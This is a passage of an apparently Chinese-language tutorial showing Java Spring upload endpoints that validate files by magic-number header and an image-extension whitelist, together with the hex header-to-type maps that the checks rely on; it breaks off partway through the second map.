<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//文件头校验文件上传demo</span><br><span class="hljs-meta">@PostMapping(&quot;upload4&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">upload4</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> MultipartFile file)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>    <span class="hljs-comment">//获取Content-Type</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">contentType</span> <span class="hljs-operator">=</span> file.getContentType();<br><br>    <span class="hljs-comment">//根据Content-Type获取类型</span><br>    <span class="hljs-comment">//此处有也可直接判断获取到的Content-Type</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileSuffix</span> <span class="hljs-operator">=</span> getExtension(contentType);<br><br>    <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> file.getInputStream();<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> cn.hutool.core.io.FileTypeUtil.getType(is);<br><br>    <span class="hljs-keyword">if</span> (!type.equals(fileSuffix))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;上传失败，不允许上传的文件类型&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//后缀白名单</span><br>    String[] allowedExtension = &#123;<span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>, <span class="hljs-string">&quot;jpeg&quot;</span>, <span class="hljs-string">&quot;gif&quot;</span>&#125;;<br><br>    <span class="hljs-comment">//判断上传文件后缀是否在白名单中</span><br>    <span class="hljs-keyword">if</span> (isAllowedExtension(fileSuffix,allowedExtension))&#123;<br>        <span class="hljs-comment">//省略文件保存至服务器代码</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;上传成功&quot;</span>;<br><br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;上传失败，不允许上传的文件类型&quot;</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>文件头校验详情如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getType</span><span class="hljs-params">(InputStream in)</span> <span class="hljs-keyword">throws</span> IORuntimeException &#123;<br>    <span class="hljs-keyword">return</span> getType(IoUtil.readHex28Upper(in));<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getType</span><span class="hljs-params">(String fileStreamHexHead)</span> &#123;<br>    <span class="hljs-type">Iterator</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> FILE_TYPE_MAP.entrySet().iterator();<br><br>    Entry fileTypeEntry;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (!var1.hasNext()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        fileTypeEntry = (Entry)var1.next();<br>    &#125; <span class="hljs-keyword">while</span>(!StrUtil.startWithIgnoreCase(fileStreamHexHead, (CharSequence)fileTypeEntry.getKey()));<br><br>    <span class="hljs-keyword">return</span> (String)fileTypeEntry.getValue();<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getType</span><span class="hljs-params">(InputStream in, String filename)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">typeName</span> <span class="hljs-operator">=</span> getType(in);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == typeName) &#123;<br>        typeName = FileUtil.extName(filename);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        String extName;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;xls&quot;</span>.equals(typeName)) &#123;<br>            extName = FileUtil.extName(filename);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;doc&quot;</span>.equalsIgnoreCase(extName)) &#123;<br>                typeName = <span class="hljs-string">&quot;doc&quot;</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;msi&quot;</span>.equalsIgnoreCase(extName)) &#123;<br>                typeName = <span class="hljs-string">&quot;msi&quot;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;zip&quot;</span>.equals(typeName)) &#123;<br>            extName = FileUtil.extName(filename);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;docx&quot;</span>.equalsIgnoreCase(extName)) &#123;<br>                typeName = <span class="hljs-string">&quot;docx&quot;</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;xlsx&quot;</span>.equalsIgnoreCase(extName)) &#123;<br>                typeName = <span class="hljs-string">&quot;xlsx&quot;</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;pptx&quot;</span>.equalsIgnoreCase(extName)) &#123;<br>                typeName = <span class="hljs-string">&quot;pptx&quot;</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;jar&quot;</span>.equalsIgnoreCase(extName)) &#123;<br>                typeName = <span class="hljs-string">&quot;jar&quot;</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;war&quot;</span>.equalsIgnoreCase(extName)) &#123;<br>                typeName = <span class="hljs-string">&quot;war&quot;</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;ofd&quot;</span>.equalsIgnoreCase(extName)) &#123;<br>                typeName = <span class="hljs-string">&quot;ofd&quot;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;jar&quot;</span>.equals(typeName)) &#123;<br>            extName = FileUtil.extName(filename);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;xlsx&quot;</span>.equalsIgnoreCase(extName)) &#123;<br>                typeName = <span class="hljs-string">&quot;xlsx&quot;</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;docx&quot;</span>.equalsIgnoreCase(extName)) &#123;<br>                typeName = <span class="hljs-string">&quot;docx&quot;</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;pptx&quot;</span>.equalsIgnoreCase(extName)) &#123;<br>                typeName = <span class="hljs-string">&quot;pptx&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> typeName;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getType</span><span class="hljs-params">(File file)</span> <span class="hljs-keyword">throws</span> IORuntimeException &#123;<br>    <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    String var2;<br>    <span class="hljs-keyword">try</span> &#123;<br>        in = IoUtil.toStream(file);<br>        var2 = getType(in, file.getName());<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        IoUtil.close(in);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> var2;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getTypeByPath</span><span class="hljs-params">(String path)</span> <span class="hljs-keyword">throws</span> IORuntimeException &#123;<br>    <span class="hljs-keyword">return</span> getType(FileUtil.file(path));<br>&#125;<br><br><span class="hljs-keyword">static</span> &#123;<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;ffd8ff&quot;</span>, <span class="hljs-string">&quot;jpg&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;89504e47&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;4749463837&quot;</span>, <span class="hljs-string">&quot;gif&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;4749463839&quot;</span>, <span class="hljs-string">&quot;gif&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;49492a00227105008037&quot;</span>, <span class="hljs-string">&quot;tif&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;424d228c010000000000&quot;</span>, <span class="hljs-string">&quot;bmp&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;424d8240090000000000&quot;</span>, <span class="hljs-string">&quot;bmp&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;424d8e1b030000000000&quot;</span>, <span class="hljs-string">&quot;bmp&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;41433130313500000000&quot;</span>, <span class="hljs-string">&quot;dwg&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;7b5c727466315c616e73&quot;</span>, <span class="hljs-string">&quot;rtf&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;38425053000100000000&quot;</span>, <span class="hljs-string">&quot;psd&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;46726f6d3a203d3f6762&quot;</span>, <span class="hljs-string">&quot;eml&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;5374616E64617264204A&quot;</span>, <span class="hljs-string">&quot;mdb&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;252150532D41646F6265&quot;</span>, <span class="hljs-string">&quot;ps&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;255044462d312e&quot;</span>, <span class="hljs-string">&quot;pdf&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;2e524d46000000120001&quot;</span>, <span class="hljs-string">&quot;rmvb&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;464c5601050000000900&quot;</span>, <span class="hljs-string">&quot;flv&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;0000001C66747970&quot;</span>, <span class="hljs-string">&quot;mp4&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;00000020667479706&quot;</span>, <span class="hljs-string">&quot;mp4&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;00000018667479706D70&quot;</span>, <span class="hljs-string">&quot;mp4&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;49443303000000002176&quot;</span>, <span class="hljs-string">&quot;mp3&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;000001ba210001000180&quot;</span>, <span class="hljs-string">&quot;mpg&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;3026b2758e66cf11a6d9&quot;</span>, <span class="hljs-string">&quot;wmv&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;52494646e27807005741&quot;</span>, <span class="hljs-string">&quot;wav&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;52494646d07d60074156&quot;</span>, <span class="hljs-string">&quot;avi&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;4d546864000000060001&quot;</span>, <span class="hljs-string">&quot;mid&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;526172211a0700cf9073&quot;</span>, <span class="hljs-string">&quot;rar&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;235468697320636f6e66&quot;</span>, <span class="hljs-string">&quot;ini&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;504B03040a0000000000&quot;</span>, <span class="hljs-string">&quot;jar&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;504B0304140008000800&quot;</span>, <span class="hljs-string">&quot;jar&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;d0cf11e0a1b11ae10&quot;</span>, <span class="hljs-string">&quot;xls&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;504B0304&quot;</span>, <span class="hljs-string">&quot;zip&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;4d5a9000030000000400&quot;</span>, <span class="hljs-string">&quot;exe&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;3c25402070616765206c&quot;</span>, <span class="hljs-string">&quot;jsp&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;4d616e69666573742d56&quot;</span>, <span class="hljs-string">&quot;mf&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;7061636b616765207765&quot;</span>, <span class="hljs-string">&quot;java&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;406563686f206f66660d&quot;</span>, <span class="hljs-string">&quot;bat&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;1f8b0800000000000000&quot;</span>, <span class="hljs-string">&quot;gz&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;cafebabe0000002e0041&quot;</span>, <span class="hljs-string">&quot;class&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;49545346030000006000&quot;</span>, <span class="hljs-string">&quot;chm&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;04000000010000001300&quot;</span>, <span class="hljs-string">&quot;mxp&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;6431303a637265617465&quot;</span>, <span class="hljs-string">&quot;torrent&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;6D6F6F76&quot;</span>, <span class="hljs-string">&quot;mov&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;FF575043&quot;</span>, <span class="hljs-string">&quot;wpd&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;CFAD12FEC5FD746F&quot;</span>, <span class="hljs-string">&quot;dbx&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;2142444E&quot;</span>, <span class="hljs-string">&quot;pst&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;AC9EBD8F&quot;</span>, <span class="hljs-string">&quot;qdf&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;E3828596&quot;</span>, <span class="hljs-string">&quot;pwl&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;2E7261FD&quot;</span>, <span class="hljs-string">&quot;ram&quot;</span>);<br>    FILE_TYPE_MAP.put(<span class="hljs-string">&quot;52494646&quot;</span>, <span class="hljs-string">&quot;webp&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>文件头校验demo2</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//文件头校验文件上传demo</span><br><span class="hljs-meta">@PostMapping(&quot;upload4&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">upload4</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> MultipartFile file)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>    <span class="hljs-comment">//获取Content-Type</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">contentType</span> <span class="hljs-operator">=</span> file.getContentType();<br><br>    <span class="hljs-comment">//根据Content-Type获取类型</span><br>    <span class="hljs-comment">//此处有也可直接判断获取到的Content-Type</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileSuffix</span> <span class="hljs-operator">=</span> getExtension(contentType);<br><br>    <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> file.getInputStream();<br><br>	<span class="hljs-comment">//根据文件头获取文件类型</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> getFileTypeByMagicNumber(is);<br><br>    <span class="hljs-keyword">if</span> (!type.equals(fileSuffix))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;上传失败，不允许上传的文件类型&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//后缀白名单</span><br>    String[] allowedExtension = &#123;<span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>, <span class="hljs-string">&quot;jpeg&quot;</span>, <span class="hljs-string">&quot;gif&quot;</span>&#125;;<br><br>    <span class="hljs-comment">//判断上传文件后缀是否在白名单中</span><br>    <span class="hljs-keyword">if</span> (isAllowedExtension(fileSuffix,allowedExtension))&#123;<br>        <span class="hljs-comment">//省略文件保存至服务器代码</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;上传成功&quot;</span>;<br><br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;上传失败，不允许上传的文件类型&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">// 默认判断文件头前三个字节内容</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">default_check_length</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;<br><span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> HashMap&lt;String, String&gt; fileTypeMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br><span class="hljs-comment">// 文件头类型</span><br><span class="hljs-keyword">static</span> &#123;<br>    fileTypeMap.put(<span class="hljs-string">&quot;ffd8ffe000104a464946&quot;</span>, <span class="hljs-string">&quot;jpg&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;89504e470d0a1a0a0000&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;47494638396126026f01&quot;</span>, <span class="hljs-string">&quot;gif&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;49492a00227105008037&quot;</span>, <span class="hljs-string">&quot;tif&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;424d228c010000000000&quot;</span>, <span class="hljs-string">&quot;bmp&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;424d8240090000000000&quot;</span>, <span class="hljs-string">&quot;bmp&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;424d8e1b030000000000&quot;</span>, <span class="hljs-string">&quot;bmp&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;41433130313500000000&quot;</span>, <span class="hljs-string">&quot;dwg&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;3c21444f435459504520&quot;</span>, <span class="hljs-string">&quot;html&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;3c21646f637479706520&quot;</span>, <span class="hljs-string">&quot;htm&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;48544d4c207b0d0a0942&quot;</span>, <span class="hljs-string">&quot;css&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;696b2e71623d696b2e71&quot;</span>, <span class="hljs-string">&quot;js&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;7b5c727466315c616e73&quot;</span>, <span class="hljs-string">&quot;rtf&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;38425053000100000000&quot;</span>, <span class="hljs-string">&quot;psd&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;46726f6d3a203d3f6762&quot;</span>, <span class="hljs-string">&quot;eml&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;d0cf11e0a1b11ae10000&quot;</span>, <span class="hljs-string">&quot;doc&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;5374616E64617264204A&quot;</span>, <span class="hljs-string">&quot;mdb&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;252150532D41646F6265&quot;</span>, <span class="hljs-string">&quot;ps&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;255044462d312e350d0a&quot;</span>, <span class="hljs-string">&quot;pdf&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;2e524d46000000120001&quot;</span>, <span class="hljs-string">&quot;rmvb&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;464c5601050000000900&quot;</span>, <span class="hljs-string">&quot;flv&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;00000020667479706d70&quot;</span>, <span class="hljs-string">&quot;mp4&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;49443303000000002176&quot;</span>, <span class="hljs-string">&quot;mp3&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;000001ba210001000180&quot;</span>, <span class="hljs-string">&quot;mpg&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;3026b2758e66cf11a6d9&quot;</span>, <span class="hljs-string">&quot;wmv&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;52494646e27807005741&quot;</span>, <span class="hljs-string">&quot;wav&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;52494646d07d60074156&quot;</span>, <span class="hljs-string">&quot;avi&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;4d546864000000060001&quot;</span>, <span class="hljs-string">&quot;mid&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;504b0304140000000800&quot;</span>, <span class="hljs-string">&quot;zip&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;526172211a0700cf9073&quot;</span>, <span class="hljs-string">&quot;rar&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;235468697320636f6e66&quot;</span>, <span class="hljs-string">&quot;ini&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;504b03040a0000000000&quot;</span>, <span class="hljs-string">&quot;jar&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;4d5a9000030000000400&quot;</span>, <span class="hljs-string">&quot;exe&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;3c25402070616765206c&quot;</span>, <span class="hljs-string">&quot;jsp&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;4d616e69666573742d56&quot;</span>, <span class="hljs-string">&quot;mf&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;3c3f786d6c2076657273&quot;</span>, <span class="hljs-string">&quot;xml&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;494e5345525420494e54&quot;</span>, <span class="hljs-string">&quot;sql&quot;</span>);<br>    